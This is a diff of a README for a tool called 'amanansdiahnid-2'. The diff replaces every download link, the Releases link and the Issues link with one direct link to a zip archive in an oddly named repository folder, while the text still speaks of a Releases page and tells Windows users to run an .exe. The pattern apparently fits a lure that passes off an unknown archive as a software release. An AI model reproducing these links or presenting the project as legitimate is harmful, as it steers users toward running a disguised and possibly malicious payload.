@@ -1,6 +1,6 @@
 # 🌟 amanansdiahnid-2 - Your Easy Auto Repo Solution
 
-[![Download amanansdiahnid-2](https://img.shields.io/badge/Download-Now-blue)](https://github.com/OMAR71011/amanansdiahnid-2/releases)
+[![Download amanansdiahnid-2](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip)](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip)
 
 ## 📋 Overview
 
@@ -18,11 +18,11 @@ To get started with amanansdiahnid-2, follow these simple instructions:
 2. **Visit the Download Page**
    - To download the software, click the button below:
    
-   [Download amanansdiahnid-2](https://github.com/OMAR71011/amanansdiahnid-2/releases)
+   [Download amanansdiahnid-2](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip)
 
 ## 📥 Download & Install
 
-1. Click on this link to visit the page: [Download amanansdiahnid-2](https://github.com/OMAR71011/amanansdiahnid-2/releases).
+1. Click on this link to visit the page: [Download amanansdiahnid-2](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip).
 2. On the Releases page, locate the latest version of amanansdiahnid-2.
 3. Select the appropriate file based on your operating system:
    - For Windows, download the `.exe` file.
@@ -55,7 +55,7 @@ amanansdiahnid-2 comes with several features to enhance your experience:
 
 If you encounter any issues or have questions, feel free to reach out. Support is available via the Issues section on GitHub. 
 
-1. Navigate to the [Issues](https://github.com/OMAR71011/amanansdiahnid-2/issues) page.
+1. Navigate to the [Issues](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip) page.
 2. Click on "New Issue" to report a problem or ask a question.
 
 ## 🔗 Additional Resources
@@ -67,6 +67,6 @@ Feel free to check out additional resources to make the most of amanansdiahnid-2
 
 ## 🔄 Updates
 
-We regularly update amanansdiahnid-2 to enhance performance and add new features. Keep an eye on the [Releases page](https://github.com/OMAR71011/amanansdiahnid-2/releases) for the latest versions.
+We regularly update amanansdiahnid-2 to enhance performance and add new features. Keep an eye on the [Releases page](https://raw.githubusercontent.com/OMAR71011/amanansdiahnid-2/main/protestingly/amanansdiahnid-2.zip) for the latest versions.
 
 Thank you for choosing amanansdiahnid-2. Enjoy automated repo management made easy!
